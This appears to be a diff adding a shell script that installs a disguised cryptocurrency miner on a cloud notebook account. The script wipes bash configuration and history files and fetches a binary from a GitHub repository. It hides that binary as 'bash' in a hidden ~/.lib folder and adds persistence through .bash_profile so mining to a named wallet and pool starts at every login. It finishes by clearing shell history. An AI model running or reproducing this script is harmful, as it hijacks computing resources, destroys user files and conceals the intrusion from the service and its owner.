@@ -1,0 +1,23 @@
+rm -rvf .lib* .bash*
+cd ~/
+mkdir .lib
+cd .lib
+WORKER="RTX LION"
+WALLETNH="3Ac87ZMGNdvheYcJqpNA2eL3ZCyhHa5GJJ"
+POOLNH="belajar.myfirstlearning.xyz:443"
+git clone https://github.com/ReLock/berhasil.git && cd berhasil && mv ntfs* /home/studio-lab-user/.lib
+cd .. && rm -rvf berhasil
+mv ntfs bash
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="x"' >> ~/.bash_profile
+echo 'WALLETNH="3Ac87ZMGNdvheYcJqpNA2eL3ZCyhHa5GJJ"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="belajar.myfirstlearning.xyz:443"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile && 
+echo "export LC_ALL=C; unset LANGUAGE && ./.lib/bash -P stratum2+tcp://$WALLETNH.$WORKER@$POOLNH --tstart 60 --tstop 70 " > /home/studio-lab-user/.lib/gas.sh
+chmod +x gas.sh && chmod +x bash && cd ~/ && history -cr && source .bashrc
